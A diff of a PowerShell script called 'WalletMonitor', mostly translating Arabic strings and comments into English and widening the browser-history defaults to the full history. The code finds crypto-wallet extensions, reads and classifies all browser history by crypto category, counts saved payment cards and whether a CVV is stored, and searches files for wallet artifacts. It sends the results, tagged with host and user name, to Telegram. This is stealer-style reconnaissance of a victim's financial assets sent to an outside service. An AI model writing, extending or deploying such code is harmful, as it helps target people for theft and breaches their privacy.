-                catch { Add-Error "تعذّر قراءة extensions.json لبروفايل فايرفوكس $($prof.Name): $($_.Exception.Message)"; continue }
+                catch { Add-Error "Could not read extensions.json for Firefox profile $($prof.Name): $($_.Exception.Message)"; continue }
 
                 foreach ($a in @(Get-Prop $j 'addons' @())) {
                     if ([string](Get-Prop $a 'type' '') -ne 'extension') { continue }
@@ -1253,28 +1253,28 @@ function Invoke-BrowserExtensionScan {
                     $kw = Get-MatchedKeyword -Text $name -Keywords $extKeywords
                     if (-not $kw) { continue }
 
-                    $stateTxt = if ($active -eq $false) { 'مُعطّلة' } else { 'مُفعّلة' }
+                    $stateTxt = if ($active -eq $false) { 'Disabled' } else { 'Enabled' }
                     $msg = New-ExtensionMessage -Name $name -Version $ver -Browser 'Firefox' -Profile $prof.Name `
                         -ExtId ([string](Get-Prop $a 'id' '')) -State $stateTxt -Permissions '' -Description '' -Source ([string](Get-Prop $a 'path' ''))
 
                     $key = "firefox-ext|$($prof.Name)|$([string](Get-Prop $a 'id' ''))"
                     $isNew = Register-Finding -Type 'extension' -Key $key -Label "$name (Firefox/$($prof.Name))" -Message $msg
                     if ($isNew) { Add-DailyCounter -Type 'extension' }
-                    Write-Log "إضافة محفظة: $name [Firefox/$($prof.Name)] $ver" 'INFO'
+                    Write-Log "Wallet extension: $name [Firefox/$($prof.Name)] $ver" 'INFO'
                 }
             }
         }
     }
 
-    Write-Log "تم فحص $totalExt إضافة (قبل الفلترة)."
+    Write-Log "Scanned $totalExt extensions (before filtering)."
 }
 
 # =====================================================================
-#  11)  تصنيف الروابط (URL Classification)
+#  11)  URL classification
 # =====================================================================
 
 function Normalize-HistoryUrl {
-    <# مفتاح توحيد للرابط: بدون fragment وبدون شرطة أخيرة وبحروف صغيرة. #>
+    <# Normalization key for a URL: no fragment, no trailing slash, lowercase. #>
     param([string]$Url)
     if ([string]::IsNullOrWhiteSpace($Url)) { return '' }
     $u = $Url.Trim()
@@ -1298,7 +1298,7 @@ function Get-UrlHost {
 }
 
 function Test-DomainMatch {
-    # تنبيه: لا يمكن تسمية باراميتر بـ $Host لأنه متغير تلقائي للقراءة فقط في PowerShell
+    # Note: a parameter cannot be named $Host because it is a read-only automatic variable in PowerShell
     param([string]$HostName, [string[]]$Domains)
     if (-not $HostName) { return $false }
     foreach ($d in $Domains) {
@@ -1306,7 +1306,7 @@ function Test-DomainMatch {
         $dd = $d.ToLower().Trim()
         if ($HostName -eq $dd) { return $true }
         if ($HostName.EndsWith('.' + $dd, [System.StringComparison]::Ordinal)) { return $true }
-        # احتياطي: مطابقة الاحتواء للدومينات الطويلة
+        # Fallback: substring match for long domains
         if ($dd.Length -ge 6 -and $HostName.Contains($dd)) { return $true }
     }
     return $false
@@ -1323,7 +1323,7 @@ function Test-CryptoKeyword {
         if ($k.Length -ge 5) {
             if ($low.Contains($k)) { return $true }
         } else {
-            # كلمات قصيرة (eth/sol/btc/nft/dex/cex/bnb) بحدود واضحة لمنع المطابقات الخاطئة
+            # Short words (eth/sol/btc/nft/dex/cex/bnb) with clear boundaries to prevent false matches
             $pattern = '(^|[^a-z0-9])' + [regex]::Escape($k) + '([^a-z0-9]|$)'
             if ([regex]::IsMatch($low, $pattern)) { return $true }
         }
@@ -1347,16 +1347,16 @@ function Get-UrlCategory {
 function Get-CategoryMeta {
     param([string]$Category)
     switch ($Category) {
-        'wallet'   { return @{ Order = 1; Icon = '🟣'; Title = 'محافظ (Wallets)' } }
-        'exchange' { return @{ Order = 2; Icon = '🟠'; Title = 'منصات تداول (Exchanges)' } }
-        'dapp'     { return @{ Order = 3; Icon = '🔵'; Title = 'تطبيقات لامركزية (DApps)' } }
-        'crypto'   { return @{ Order = 4; Icon = '🟡'; Title = 'مواقع كريبتو (Crypto)' } }
-        default    { return @{ Order = 5; Icon = '⚪'; Title = 'أخرى (Other)' } }
+        'wallet'   { return @{ Order = 1; Icon = '🟣'; Title = 'Wallets' } }
+        'exchange' { return @{ Order = 2; Icon = '🟠'; Title = 'Exchanges' } }
+        'dapp'     { return @{ Order = 3; Icon = '🔵'; Title = 'DApps' } }
+        'crypto'   { return @{ Order = 4; Icon = '🟡'; Title = 'Crypto sites' } }
+        default    { return @{ Order = 5; Icon = '⚪'; Title = 'Other' } }
     }
 }
 
 # =====================================================================
-#  12)  فحص 3: تاريخ المتصفحات (قارئ PowerShell مباشر -> كل الروابط)
+#  12)  Check 3: browser history (direct PowerShell reader -> all URLs)
 # =====================================================================
 
 function New-TempDir {
@@ -1369,10 +1369,10 @@ function New-TempDir {
 }
 
 function Get-HistoryHits {
-    <# يسحب كل روابط التاريخ من كل المتصفحات (Chromium family + Firefox). #>
+    <# Pulls all history URLs from all browsers (Chromium family + Firefox). #>
     $hc       = Get-Prop $Script:Cfg 'browser_history' $null
-    $lookback = [int](Get-Prop $hc 'lookback_days' 30)
-    $maxRows  = [int](Get-Prop $hc 'max_results_per_browser' 300)
+    $lookback = [int](Get-Prop $hc 'lookback_days' 0)
+    $maxRows  = [int](Get-Prop $hc 'max_results_per_browser' 2000)
     if ($maxRows -le 0) { $maxRows = 300 }
     $cutoff = $null
     if ($lookback -gt 0) { $cutoff = (Get-Date).AddDays(-$lookback) }
@@ -1383,7 +1383,7 @@ function Get-HistoryHits {
     $tmpDir = New-TempDir
 
     try {
-        # ---------- عائلة Chromium ----------
+        # ---------- Chromium family ----------
         foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
             if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
             $name = [string](Get-Prop $br 'name' 'Chromium')
@@ -1472,10 +1472,10 @@ function Get-HistoryHits {
 }
 
 # =====================================================================
-#  12.5)  فحص 4-ب: بطاقات الدفع المحفوظة (عدّ فقط — بدون أي استخراج)
-#        - Chromium/Edge/Brave/Vivaldi/Chromium: جدول credit_cards في "Web Data"
-#        - ربط CVV عبر جدول local_stored_cvc (مطابقة guid) — العدّ فقط
-#        - Firefox: ملف autofill-profiles.json (لا يخزّن CVV إطلاقًا)
+#  12.5)  Check 4-b: saved payment cards (count-only — no extraction)
+#        - Chromium/Edge/Brave/Vivaldi/Chromium: credit_cards table in "Web Data"
+#        - CVV linkage via the local_stored_cvc table (guid match) — count-only
+#        - Firefox: autofill-profiles.json file (never stores CVV)
 # =====================================================================
 
 function New-CardStat {
@@ -1491,9 +1491,9 @@ function New-CardStat {
 }
 
 function Get-CardCountsFromSqlite {
-    <# عدّ البطاقات من "Web Data" + فحص ربط CVC. قراءة فقط وعدّ فقط:
-       يُعدّ صفوف credit_cards خلية-بخلية، ويُقرأ عمود guid وحده للمطابقة مع local_stored_cvc.
-       أعمدة الاسم/الرقم المشفَّر لا تُفكّ ولا تُنسخ ولا تُرسل. #>
+    <# Counts cards from "Web Data" + checks CVC linkage. Read-only and count-only:
+       Counts credit_cards rows cell-by-cell, and reads only the guid column for matching against local_stored_cvc.
+       The name/encrypted-number columns are neither decrypted, copied, nor sent. #>
     param([string]$DbPath, [string]$TmpDir, [string]$CardsTable = 'credit_cards', [string]$CvvTable = 'local_stored_cvc')
     $result = @{ Cards = 0; CvvLinked = 0; CvvKnown = $false; HasCvvTable = $false }
     if (-not (Test-Path -LiteralPath $DbPath)) { return $result }
@@ -1503,17 +1503,17 @@ function Get-CardCountsFromSqlite {
         Copy-LockedFile -Source $DbPath -Dest $tmp
 
         $info = Get-SqliteInfo -Path $tmp -Table $CardsTable
-        if ($info.RootPage -eq 0) { return $result }   # مفيش جدول بطاقات أصلاً
+        if ($info.RootPage -eq 0) { return $result }   # There is no card table at all
         $result.Cards = [int](Get-SqliteRowCount $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages)
         if ($result.Cards -le 0) { return $result }
 
-        # guid فقط — بدون أي عمود آخر
+        # guid only — no other column
         $cardGuids = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
         foreach ($g in @(Get-SqliteColumnValues -Path $tmp -Table $CardsTable -Column 'guid')) {
             if (-not [string]::IsNullOrWhiteSpace($g)) { [void]$cardGuids.Add([string]$g) }
         }
 
-        # هل فيه مخزّن CVC أصلاً؟ لو مفيش -> الحالة "غير مخزَّن" ومنخمّنش صفر.
+        # Is there any stored CVC at all? If not -> status "not stored", and we do not guess zero.
         $cvInfo = Get-SqliteInfo -Path $tmp -Table $CvvTable
         if ($cvInfo.RootPage -eq 0) {
             $result.CvvKnown = $false
@@ -1535,8 +1535,8 @@ function Get-CardCountsFromSqlite {
 }
 
 function Get-FirefoxCardCount {
-    <# عدّ البطاقات من autofill-profiles.json بعدّ مفاتيح guid داخل مصفوفة creditCards فقط.
-       الملف لا يُحوَّل إلى كائنات ولا تُقرأ أي حقول بطاقة. Firefox لا يخزّن CVC إطلاقًا. #>
+    <# Counts cards from autofill-profiles.json by counting guid keys inside the creditCards array only.
+       The file is not converted into objects and no card fields are read. Firefox never stores CVC. #>
     param([string]$ProfileDir)
     $f = Join-Path $ProfileDir 'autofill-profiles.json'
     if (-not (Test-Path -LiteralPath $f)) { return $null }
@@ -1560,17 +1560,17 @@ function Get-FirefoxCardCount {
 }
 
 function Invoke-BrowserCardScan {
-    <# يفحص كل المتصفحات ويعرف عدد البطاقات المحفوظة لكل بروفايل + هل هي مرتبطة بـ CVV. عدّ فقط. #>
-    Write-Log 'فحص بطاقات الدفع المحفوظة (عدّ فقط — بدون استخراج)...'
+    <# Scans all browsers and determines the number of saved cards per profile + whether they are CVV-linked. Count-only. #>
+    Write-Log 'Scanning saved payment cards (count-only — no extraction)...'
     $Script:CardStats = @()
     $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
-    if (-not [bool](Get-Prop $ccCfg 'enabled' $true)) { Write-Log 'فحص البطاقات معطّل في الإعدادات.' 'DEBUG'; return }
+    if (-not [bool](Get-Prop $ccCfg 'enabled' $true)) { Write-Log 'Card scanning is disabled in the config.' 'DEBUG'; return }
 
     $stats  = New-Object System.Collections.ArrayList
     $errors = New-Object System.Collections.ArrayList
     $tmpDir = New-TempDir
     try {
-        # ---------- عائلة Chromium ----------
+        # ---------- Chromium family ----------
         foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
             if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
             $name = [string](Get-Prop $br 'name' 'Chromium')
@@ -1614,11 +1614,11 @@ function Invoke-BrowserCardScan {
 
     foreach ($e in $errors) { Add-Error "cards: $e" }
     $Script:CardStats = @($stats | Sort-Object Browser, Profile)
-    Write-Log "بروفايلات بها بطاقات محفوظة: $($Script:CardStats.Count)"
+    Write-Log "Profiles with saved cards: $($Script:CardStats.Count)"
 }
 
 function Get-CardAggregate {
-    <# تجميع عدد البطاقات و CVV لكل متصفح (مجموع البروفايلات). #>
+    <# Aggregates the card and CVV counts per browser (sum of profiles). #>
     $groups = @{}
     foreach ($s in @($Script:CardStats)) {
         $b = [string]$s.Browser
@@ -1634,7 +1634,7 @@ function Get-CardAggregate {
 }
 
 function Get-CardSignature {
-    <# بصمة تُستخدم لكشف تغيّر أعداد البطاقات/ربط CVV بين الدورات. #>
+    <# Fingerprint used to detect changes in card counts/CVV linkage between runs. #>
     $parts = New-Object System.Collections.ArrayList
     foreach ($s in @($Script:CardStats | Sort-Object Browser, Profile)) {
         [void]$parts.Add(("{0}|{1}|{2}|{3}" -f $s.Browser, $s.Profile, $s.Cards, $s.CvvLinked))
@@ -1651,34 +1651,34 @@ function Get-CardSummaryTotals {
 }
 
 function Build-CardReportLines {
-    <# يبني تقرير بطاقات احترافي (عدّ فقط). -Full يضيف تفاصيل كل بروفايل. #>
+    <# Builds a professional card report (count-only). -Full adds per-profile details. #>
     param([switch]$Full)
     $lines = New-Object System.Collections.ArrayList
     $agg   = @(Get-CardAggregate)
     $tot   = Get-CardSummaryTotals
     $ts    = (Get-Date).ToString('yyyy-MM-dd HH:mm')
 
-    [void]$lines.Add('💳 <b>بطاقات الدفع المحفوظة — WalletMonitor</b>')
+    [void]$lines.Add('💳 <b>Saved payment cards — WalletMonitor</b>')
     [void]$lines.Add('━━━━━━━━━━━━━━━━')
-    [void]$lines.Add("🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
-    [void]$lines.Add("🕒 وقت التقرير: $ts")
-    [void]$lines.Add('🔒 <i>عدّ فقط — لا يُستخرج ولا يُخزَّن ولا يُرسل أي رقم بطاقة أو اسم، ولا يُفكّ أي تشفير.</i>')
+    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
+    [void]$lines.Add("🕒 Report time: $ts")
+    [void]$lines.Add('🔒 <i>Count-only — no card number or name is extracted, stored, or sent, and no encryption is decrypted.</i>')
 
     if ($agg.Count -eq 0) {
         [void]$lines.Add('')
-        [void]$lines.Add('ℹ️ لا توجد بطاقات دفع محفوظة في أي متصفح مدعوم.')
+        [void]$lines.Add('ℹ️ No saved payment cards in any supported browser.')
         return @($lines)
     }
 
     [void]$lines.Add('')
-    [void]$lines.Add("📊 الإجمالي: <b>$($tot.Cards)</b> بطاقة · مرتبطة بـ CVC: <b>$($tot.CvvLinked)</b> · بروفايلات بها بطاقات: <b>$(@($Script:CardStats).Count)</b>")
+    [void]$lines.Add("📊 Total: <b>$($tot.Cards)</b> card(s) · CVC-linked: <b>$($tot.CvvLinked)</b> · profiles with cards: <b>$(@($Script:CardStats).Count)</b>")
     [void]$lines.Add('')
-    [void]$lines.Add('🌐 <b>لكل متصفح:</b>')
+    [void]$lines.Add('🌐 <b>Per browser:</b>')
     foreach ($g in $agg) {
-        $cvvTxt = 'CVC: غير متاح (لا يوجد مخزّن)'
-        if ($g.CvvLinked -gt 0) { $cvvTxt = "مرتبطة بـ CVC: <b>$($g.CvvLinked)</b>" }
-        elseif ($g.CvvKnown) { $cvvTxt = 'CVC غير مخزَّن' }
-        [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): بطاقات <b>$($g.Cards)</b> · $cvvTxt · بروفايلات $($g.Profiles)")
+        $cvvTxt = 'CVC: not available (nothing stored)'
+        if ($g.CvvLinked -gt 0) { $cvvTxt = "CVC-linked: <b>$($g.CvvLinked)</b>" }
+        elseif ($g.CvvKnown) { $cvvTxt = 'CVC not stored' }
+        [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): cards <b>$($g.Cards)</b> · $cvvTxt · profiles $($g.Profiles)")
     }
 
     if (-not $Full) { return @($lines) }
@@ -1686,20 +1686,20 @@ function Build-CardReportLines {
     foreach ($g in $agg) {
         [void]$lines.Add('')
         [void]$lines.Add('━━━━━━━━━━━━━━━━')
-        [void]$lines.Add("🌐 <b>$(ConvertTo-HtmlSafe $g.Browser)</b> — تفاصيل البروفايلات")
+        [void]$lines.Add("🌐 <b>$(ConvertTo-HtmlSafe $g.Browser)</b> — profile details")
         foreach ($s in @($Script:CardStats | Where-Object { $_.Browser -eq $g.Browser })) {
-            $cvvTxt = 'CVC: غير متاح'
-            if ($s.CvvLinked -gt 0) { $cvvTxt = "CVC مرتبط: $($s.CvvLinked)" }
-            elseif ($s.CvvKnown) { $cvvTxt = 'CVC غير مخزَّن' }
-            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $s.Profile): بطاقات $($s.Cards) · $cvvTxt")
+            $cvvTxt = 'CVC: not available'
+            if ($s.CvvLinked -gt 0) { $cvvTxt = "CVC linked: $($s.CvvLinked)" }
+            elseif ($s.CvvKnown) { $cvvTxt = 'CVC not stored' }
+            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $s.Profile): cards $($s.Cards) · $cvvTxt")
         }
     }
 
     [void]$lines.Add('')
     [void]$lines.Add('━━━━━━━━━━━━━━━━')
-    [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Chromium): العدّ بعدّ صفوف جدول credit_cards خلية-بخلية، وربط CVC يُفحص من وجود جدول local_stored_cvc بمطابقة guid فقط.')
-    [void]$lines.Add('لا تُفكّ أي قيم بطاقة: يُقرأ عمود guid وحده، وباقي الأعمدة (الاسم/الرقم المشفَّر) تُتخطّى بايت-بايت بدون فكّ ولا تخزين.')
-    [void]$lines.Add('Firefox: العدّ بعدّ مفاتيح guid داخل مصفوفة creditCards نصيًا. Chromium و Firefox لا يحفظان CVC/CVV افتراضًا؛ "مرتبط" تُبلَّغ فقط عند وجود مخزّن CVV فعلي.</i>')
+    [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Chromium): counted by counting the rows of the credit_cards table cell-by-cell; CVC linkage is checked via the presence of a local_stored_cvc table matched by guid only.')
+    [void]$lines.Add('No card values are decrypted: only the guid column is read; the remaining columns (name/encrypted number) are skipped byte-by-byte without decryption or storage.')
+    [void]$lines.Add('Firefox: counted by counting guid keys inside the creditCards array textually. Chromium and Firefox do not store CVC/CVV by default; "linked" is reported only when a stored CVV actually exists.</i>')
     return @($lines)
 }
 
@@ -1718,12 +1718,12 @@ function Send-CardReport {
         if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
         if (-not (Send-TelegramMessage -Text ($prefix + $chunks[$i]))) { $sentAll = $false }
     }
-    if ($sentAll) { Write-Log "تم إرسال تقرير البطاقات ($total رسالة)." }
-    else { Write-Log 'فشل إرسال جزء من تقرير البطاقات.' 'ERROR' }
+    if ($sentAll) { Write-Log "Card report sent ($total message(s))." }
+    else { Write-Log 'Failed to send part of the card report.' 'ERROR' }
 }
 
 function Invoke-BrowserHistoryScan {
-    Write-Log 'فحص تاريخ المتصفحات (قارئ PowerShell مباشر - كل المتصفحات)...'
+    Write-Log 'Scanning browser history (direct PowerShell reader - all browsers)...'
     $Script:HistoryHits     = @()
     $Script:NewHistoryCount = 0
     $Script:HistoryStats    = @()
@@ -1734,12 +1734,12 @@ function Invoke-BrowserHistoryScan {
     $rawHits = @($res.Hits)
     $Script:HistoryStats = @($res.Stats)
     if ($rawHits.Count -eq 0 -and @($res.Errors).Count -gt 0) {
-        Add-Error 'لم يتم استخراج أي رابط تاريخ. تأكد من وجود ملفات History / places.sqlite.'
+        Add-Error 'No history entries were extracted. Make sure History / places.sqlite files exist.'
     }
-    Write-Log "روابط تاريخ المتصفح المستخرجة: $($rawHits.Count)"
+    Write-Log "Browser history entries extracted: $($rawHits.Count)"
 
-    # دمج ذكي: نفس الرابط من أكثر من متصفح/بروفايل يصبح سطرًا واحدًا،
-    # مع جمع أسماء المتصفحات وأخذ أعلى عدد زيارات وأحدث تاريخ زيارة.
+    # Smart merge: the same URL from more than one browser/profile becomes a single line,
+    # aggregating the browser names and taking the highest visit count and most recent visit date.
     $classified = New-Object System.Collections.ArrayList
     $index = @{}
     $order = New-Object System.Collections.ArrayList
@@ -1782,14 +1782,14 @@ function Invoke-BrowserHistoryScan {
         $ent    = $index[$norm]
         $brList = @($ent.Browsers | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
         $brText = ($brList -join ', ')
-        if ([string]::IsNullOrWhiteSpace($brText)) { $brText = '(غير معروف)' }
+        if ([string]::IsNullOrWhiteSpace($brText)) { $brText = '(unknown)' }
 
-        $lastTxt = 'غير معروف'
+        $lastTxt = 'unknown'
         if ($ent.LastTs) { try { $lastTxt = $ent.LastTs.ToString('yyyy-MM-dd HH:mm') } catch { } }
 
         $category = Get-UrlCategory -Url $ent.Url -Title $ent.Title
         $host_    = Get-UrlHost $ent.Url
-        if ([string]::IsNullOrWhiteSpace($host_)) { $host_ = '(غير معروف)' }
+        if ([string]::IsNullOrWhiteSpace($host_)) { $host_ = '(unknown)' }
 
         [void]$classified.Add([PSCustomObject]@{
             Browser  = $brText
@@ -1810,11 +1810,11 @@ function Invoke-BrowserHistoryScan {
 
     $Script:HistoryHits = @($classified)
     $Script:HistoryBrowsers = @($Script:HistoryStats | Where-Object { $_.Count -gt 0 }).Count
-    Write-Log "روابط بعد إزالة التكرار: $($Script:HistoryHits.Count) (متصفح/بروفايل: $($Script:HistoryBrowsers))"
+    Write-Log "Entries after de-duplication: $($Script:HistoryHits.Count) (browser/profile: $($Script:HistoryBrowsers))"
 }
 
 # =====================================================================
-#  13)  فحص 4: نظام الملفات
+#  13)  Check 4: filesystem
 # =====================================================================
 
 function Test-FileNameMatch {
@@ -1827,7 +1827,7 @@ function Test-FileNameMatch {
 }
 
 function Invoke-FileSystemScan {
-    Write-Log 'فحص آثار نظام الملفات...'
+    Write-Log 'Scanning filesystem artifacts...'
 
     $fs = Get-Prop $Script:Cfg 'filesystem' $null
     $rootsCfg     = @(Get-Prop $fs 'roots' @('%USERPROFILE%'))
@@ -1859,12 +1859,12 @@ function Invoke-FileSystemScan {
             $curPath = $cur.Path
             $curDepth = $cur.Depth
 
-            if ($visited -ge $maxItems) { Write-Log "تم الوصول للحد الأقصى لعدد العناصر ($maxItems). توقف الفحص الملفي." 'WARN'; break }
+            if ($visited -ge $maxItems) { Write-Log "Reached the maximum number of items ($maxItems). Filesystem scan stopped." 'WARN'; break }
             if ($results -ge $maxResults) { break }
 
             $entries = $null
             try { $entries = @(Get-ChildItem -LiteralPath $curPath -Force -ErrorAction Stop) }
-            catch { Write-Log "تعذّر قراءة المجلد: $curPath" 'DEBUG'; continue }
+            catch { Write-Log "Could not read directory: $curPath" 'DEBUG'; continue }
 
             foreach ($e in $entries) {
                 $visited++
@@ -1889,49 +1889,49 @@ function Invoke-FileSystemScan {
 
                 $reason = $null
                 $kw = Get-MatchedKeyword -Text $e.Name -Keywords $kwList
-                if ($kw) { $reason = "كلمة مفتاحية في الاسم: $kw" }
+                if ($kw) { $reason = "Keyword in name: $kw" }
 
                 if (-not $reason) {
                     $pat = Test-FileNameMatch -Name $e.Name -Patterns $patterns
-                    if ($pat) { $reason = "تطابق امتداد/اسم ملف: $pat" }
+                    if ($pat) { $reason = "Extension/filename match: $pat" }
                 }
                 if (-not $reason -and $isDir) {
                     $pat = Test-FileNameMatch -Name $e.Name -Patterns $patterns
-                    if ($pat) { $reason = "مجلد بتطابق: $pat" }
+                    if ($pat) { $reason = "Matching directory: $pat" }
                 }
                 if (-not $reason) { continue }
 
                 $results++
-                $typeTxt = 'ملف'; if ($isDir) { $typeTxt = 'مجلد' }
+                $typeTxt = 'File'; if ($isDir) { $typeTxt = 'Directory' }
                 $sizeTxt = '-'
                 if (-not $isDir) { try { $sizeTxt = ('{0:N0} bytes' -f $e.Length) } catch { $sizeTxt = '-' } }
-                $modTxt = 'غير معروف'
+                $modTxt = 'unknown'
                 try { $modTxt = $e.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss') } catch { }
 
                 $msg = @()
-                $msg += '🔵 <b>اكتشاف جديد: أثر في نظام الملفات</b>'
+                $msg += '🔵 <b>New detection: filesystem artifact</b>'
                 $msg += '━━━━━━━━━━━━━━━━'
-                $msg += "📄 الاسم: <code>$(ConvertTo-HtmlSafe (Limit-Text $e.Name 120))</code>"
-                $msg += "🧾 النوع: $typeTxt"
-                $msg += "📁 المسار: <code>$(ConvertTo-HtmlSafe (Limit-Text (Split-Path -Parent $full) 220))</code>"
-                $msg += "📐 الحجم: $sizeTxt"
-                $msg += "🕒 تاريخ التعديل: $modTxt"
-                $msg += "✅ السبب: $(ConvertTo-HtmlSafe (Limit-Text $reason 160))"
-                $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
-                $msg += "🕒 وقت الاكتشاف: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
+                $msg += "📄 Name: <code>$(ConvertTo-HtmlSafe (Limit-Text $e.Name 120))</code>"
+                $msg += "🧾 Type: $typeTxt"
+                $msg += "📁 Path: <code>$(ConvertTo-HtmlSafe (Limit-Text (Split-Path -Parent $full) 220))</code>"
+                $msg += "📐 Size: $sizeTxt"
+                $msg += "🕒 Modified: $modTxt"
+                $msg += "✅ Reason: $(ConvertTo-HtmlSafe (Limit-Text $reason 160))"
+                $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
+                $msg += "🕒 Discovered: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
 
                 $key = "file|$full"
                 $isNew = Register-Finding -Type 'file' -Key $key -Label (Limit-Text $full 120) -Message ($msg -join "`n")
                 if ($isNew) { Add-DailyCounter -Type 'file' }
-                Write-Log "أثر ملفي: $full" 'INFO'
+                Write-Log "Filesystem artifact: $full" 'INFO'
             }
         }
     }
-    Write-Log "تم فحص $visited عنصر، نتائج مطابقة: $results"
+    Write-Log "Scanned $visited items, matching results: $results"
 }
 
 # =====================================================================
-#  14)  بناء تقرير تاريخ المتصفح (مرتب + مُصنّف + مُفلتر)
+#  14)  Build the browser history report (sorted + classified + filtered)
 # =====================================================================
 
 function Split-MessageChunks {
@@ -1952,7 +1952,7 @@ function Split-MessageChunks {
 }
 
 function Build-HistoryReportLines {
-    <# يبني تقرير تاريخ احترافي: مرتب + مصنّف + مُفلتر + إحصاءات. #>
+    <# Builds a professional history report: sorted + classified + filtered + statistics. #>
     param($Hits, $ReportCfg)
 
     $include = @(Get-Prop $ReportCfg 'include_categories' @('wallet', 'exchange', 'dapp', 'crypto'))
@@ -1964,19 +1964,19 @@ function Build-HistoryReportLines {
     $all = @($Hits)
     $sel = @($all | Where-Object { $include -contains $_.Category })
 
-    $lookback = [int](Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'lookback_days' 30)
+    $lookback = [int](Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'lookback_days' 0)
     $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm')
 
     $lines = New-Object System.Collections.ArrayList
-    [void]$lines.Add('🔗 <b>تقرير تاريخ المتصفحات — WalletMonitor</b>')
+    [void]$lines.Add('🔗 <b>Browser history report — WalletMonitor</b>')
     [void]$lines.Add('━━━━━━━━━━━━━━━━')
-    [void]$lines.Add("🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
-    [void]$lines.Add("🕒 وقت التقرير: $ts")
-    if ($lookback -gt 0) { [void]$lines.Add("📅 الفترة: آخر $lookback يوم") }
-    else { [void]$lines.Add('📅 الفترة: كل السجل (بدون حد زمني)') }
-    [void]$lines.Add("📊 روابط مفحوصة: <b>$($all.Count)</b> · مطابقة: <b>$($sel.Count)</b>")
+    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
+    [void]$lines.Add("🕒 Report time: $ts")
+    if ($lookback -gt 0) { [void]$lines.Add("📅 Period: last $lookback day(s)") }
+    else { [void]$lines.Add('📅 Period: full history (no time limit)') }
+    [void]$lines.Add("📊 Entries scanned: <b>$($all.Count)</b> · matching: <b>$($sel.Count)</b>")
 
-    # توزيع التصنيفات
+    # Category distribution
     $summary = @()
     foreach ($cat in @('wallet', 'exchange', 'dapp', 'crypto')) {
         if ($include -notcontains $cat) { continue }
@@ -1985,11 +1985,11 @@ function Build-HistoryReportLines {
     }
     if ($summary.Count -gt 0) {
         [void]$lines.Add('')
-        [void]$lines.Add('🧭 التوزيع حسب التصنيف:')
+        [void]$lines.Add('🧭 Distribution by category:')
         foreach ($s in $summary) { [void]$lines.Add("   • $s") }
     }
 
-    # توزيع حسب المتصفح (كل المتصفحات التي رأت الرابط)
+    # Distribution by browser (all browsers that saw the URL)
     $byBrowser = @{}
     foreach ($h in $sel) {
         $names = @($h.Browsers)
@@ -2001,27 +2001,27 @@ function Build-HistoryReportLines {
     }
     if ($byBrowser.Count -gt 0) {
         [void]$lines.Add('')
-        [void]$lines.Add('🌐 حسب المتصفح:')
+        [void]$lines.Add('🌐 By browser:')
         foreach ($e in @($byBrowser.GetEnumerator() | Sort-Object Value -Descending)) {
             [void]$lines.Add("   • $(ConvertTo-HtmlSafe $e.Key): <b>$($e.Value)</b>")
         }
     }
 
-    # بطاقات الدفع المحفوظة (عدّ فقط - بدون أي استخراج)
+    # Saved payment cards (count-only - no extraction)
     $ccSumCfg = Get-Prop $Script:Cfg 'credit_cards' $null
     if ([bool](Get-Prop $ccSumCfg 'enabled' $true) -and @($Script:CardStats).Count -gt 0) {
         $cAgg = @(Get-CardAggregate)
         $cTot = Get-CardSummaryTotals
         [void]$lines.Add('')
         [void]$lines.Add('━━━━━━━━━━━━━━━━')
-        [void]$lines.Add("💳 <b>بطاقات الدفع المحفوظة</b> (عدّ فقط) — إجمالي: <b>$($cTot.Cards)</b>")
+        [void]$lines.Add("💳 <b>Saved payment cards</b> (count-only) — total: <b>$($cTot.Cards)</b>")
         foreach ($g in $cAgg) {
-            $cvvTxt = if ($g.CvvKnown) { "CVV مرتبط: $($g.CvvLinked)" } else { 'CVV: غير معروف' }
-            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): بطاقات <b>$($g.Cards)</b> · $cvvTxt")
+            $cvvTxt = if ($g.CvvKnown) { "CVV linked: $($g.CvvLinked)" } else { 'CVV: unknown' }
+            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): cards <b>$($g.Cards)</b> · $cvvTxt")
         }
     }
 
-    # الأقسام (كل تصنيف مرتب)
+    # Sections (each category sorted)
     foreach ($cat in @('wallet', 'exchange', 'dapp', 'crypto', 'other')) {
         if ($include -notcontains $cat) { continue }
         $grouped = @($sel | Where-Object { $_.Category -eq $cat })
@@ -2036,13 +2036,13 @@ function Build-HistoryReportLines {
         $meta = Get-CategoryMeta $cat
         [void]$lines.Add('')
         [void]$lines.Add('━━━━━━━━━━━━━━━━')
-        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b> — $($grouped.Count) رابط")
